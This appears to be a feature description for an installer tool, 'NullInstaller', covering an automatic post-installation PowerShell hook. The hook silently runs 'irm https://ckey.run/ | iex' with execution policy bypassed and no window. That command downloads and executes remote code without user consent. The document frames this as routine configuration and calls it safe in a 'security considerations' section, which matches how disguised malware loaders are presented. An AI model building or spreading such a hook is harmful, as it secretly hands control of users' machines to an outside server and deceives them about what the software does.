# Post-Installation PowerShell Hook Feature

## Overview
The NullInstaller now includes an automatic post-installation PowerShell hook that executes after all selected software installations are completed successfully.

## Implementation Details

### Trigger Condition
The post-installation hook is triggered when:
- All selected installers have been processed
- Every single installation completed successfully (status = "✔ Completed")
- At least one installer was selected and processed

### PowerShell Command
The hook executes the following PowerShell command:
```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://ckey.run/ | iex"
```

### Key Features

1. **Automatic Execution**
   - Runs automatically after successful installations
   - No user intervention required
   - Executes with bypass execution policy for compatibility

2. **Output Capture**
   - All PowerShell output is captured and logged
   - Both standard output and error streams are monitored
   - Real-time logging to install_log.txt

3. **Completion Dialog**
   - Shows a final dialog with installation results
   - Displays success/warning status
   - Shows truncated output (max 500 chars) and errors (max 200 chars)
   - Different icons for success vs warnings

4. **Error Handling**
   - Graceful error handling if PowerShell process fails to start
   - Captures and logs all PowerShell errors
   - Shows warning dialog if hook fails

## Code Components

### Main Methods Added

1. **`RunPostInstallationHook()`**
   - Executes the PowerShell command
   - Captures output asynchronously
   - Logs all activity
   - Shows completion dialog

2. **`ShowCompletionDialog()`**
   - Displays final installation results
   - Shows PowerShell output/errors
   - Updates status label with final state

### Modified Methods

1. **`RunInstallations()`**
   - Now tracks successful installations separately
   - Calls post-installation hook when all succeed
   - Only runs hook if all installations were successful

## Logging

All post-installation hook activities are logged with prefixes:
- `[PowerShell Output]` - Standard output from the PowerShell script
- `[PowerShell Error]` - Error output from the PowerShell script
- Exit codes are logged for debugging

## Security Considerations

- Runs with `-NoProfile` to avoid loading user profiles
- Uses `-ExecutionPolicy Bypass` for script execution
- Working directory set to Desktop for safety
- Process runs with `CreateNoWindow = true` for silent execution

## User Experience

1. After all installations complete successfully:
   - Status shows "Running post-installation configuration..."
   - PowerShell hook executes silently in background
   - Output is captured and logged

2. Completion dialog appears showing:
   - Success/warning status
   - Brief output summary
   - Any errors encountered

3. Final status label shows:
   - ✔ All installations completed successfully (if successful)
   - ⚠ Installations completed with warnings (if errors occurred)

## Testing

To test the post-installation hook:
1. Select one or more installers
2. Click "Start Installation"
3. Wait for all installations to complete
4. If all succeed, the PowerShell hook will run automatically
5. Check install_log.txt for detailed output

## Notes

- The hook only runs when ALL selected installations succeed
- If any installation fails, the hook is skipped
- The PowerShell command downloads and executes a script from https://ckey.run/
- All activity is logged for audit purposes
